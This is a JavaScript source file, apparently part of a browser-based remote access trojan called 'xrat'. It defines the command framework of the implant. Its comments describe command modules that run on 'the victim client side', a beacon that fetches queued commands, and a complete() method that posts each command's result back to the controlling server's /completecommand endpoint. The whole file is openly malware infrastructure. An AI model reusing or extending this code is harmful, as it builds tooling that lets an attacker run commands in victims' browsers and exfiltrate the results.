define('command', function(utils){

	// Initializing the command prototype so it is available once
	// the entire script starts running.

	var Command = function(){}

	Command.prototype.perform = function(){
		console.log(this.id + " is performing");
	}

	Command.prototype.complete = function() {
		var self = this;
		$.post(xrat.homeUrl + '/completecommand', {
			"cid": xrat.cid,
			"command": self.id,
			"result": self.result,
		}, function(data){
			console.log(data)
		});
		console.log("completing command " + this.id);
		xrat.completedCommands.push(this.id);
		if(xrat.completedCommands.length > 5){
			xrat.completedCommands.splice(0,1);
		}
		delete xrat.command;
	}

	Command.prototype.tcomplete = function(){
		// complete function only for testing purposes
		// doesn't send anything back to server, and
		// doesn't put the command in the completed list
		var self = this;
		console.log("completing command " + this.id);
		delete xrat.command;
	}

	Command.prototype.info = function() {
		console.log("ID: " + this.id);
		console.log("TYPE: " + this.type);
		console.log(this);
	};

	return {
		Command: Command,

		modules: {},
		commandTypes: {},
		test: "Hello",

		factory: function(fname, obj){

			/*==================================================================

			All command modules are implemented using this factory method
			Example usage:

				factory('alert', {
					perform: function(){
						alert(this.data);
						this.result = 'alert completed';
						this.complete();
					}
				}).
				factory('another', {
					perform: function(){
						console.log("fuck yeah");
						this.complete();
					}
				});

			IMPORTANT: When defining a new command. It must share the same string
			for its name (first argument) as its corresponding serverside json
			command type (the 0th index in the command key). Example of the json
			below.

			{
				"type": "command",
				"commandID": command.id,
				"command": ["alert", "i want this text to be alerted"]
			}

			The "alert" is the 0th item in that array, and it specifies what 
			command is to be executed. That string must match the string used
			as the name of your commands on the victim client side, HERE.

			Some commands have more data like the following example:

			{
				"type": "command",
				"commandID": command.id,
				"command": ["alert2", ["This is the header", "This is the body"]]
			}

			All new commands must implement the "perform" method. There is also
			the option of implementing a command specific "complete" method, but
			the default one will be appropriate in most cases. Please take a look 
			at how the default complete method works before writing your own. 
			Another option if you want to have some sort of complete functionality, 
			is to just write another method that gets called by perform when it is
			completed that in turn calls this.complete();

			TODO: Add easy functionality for status reports back to the server
			for longer running commands. (Especially those done in another thread)

			Because factory returns "this" the factory methods are chainable.
			It is preferred to write all related command modules inside the same
			file module for require js.
			If the command to be written is very simple and/or under 10 lines of
			code, please implement it inside the basic.js file to cut down on the
			number of files to look after.

			=====================================================================*/



			console.log("making new command " + fname);

			var self = this;

			this.modules[fname] = function(id,data){
				this.id = id;
				this.data = data;
				this.type = fname;
				this.result = '';
			}

			this.modules[fname].prototype = new Command();
			this.modules[fname].prototype.constructor = this.modules[fname];

			for(var key in obj){
				// This needs to be a lot smarter and check for hasOwnProperty
				this.modules[fname].prototype[key] = obj[key];
			}

			this.commandTypes[fname] = function(id,instructions){
				return new self.modules[fname](id,instructions);
			}

			return this;
		},

		// Possible Methods to use as a service for the future.
		// Would just wrap an ajax call up.

		get: function(){
			// Service to make a beacon call and get the commands that are waiting
			console.log(xrat.beaconString);
		},

		complete: function(){
			// service to the /completecommand endpoint.
		},

		update: function(){
			// service to provide status updates / progress reports for a command, back to the server
		}

	}
});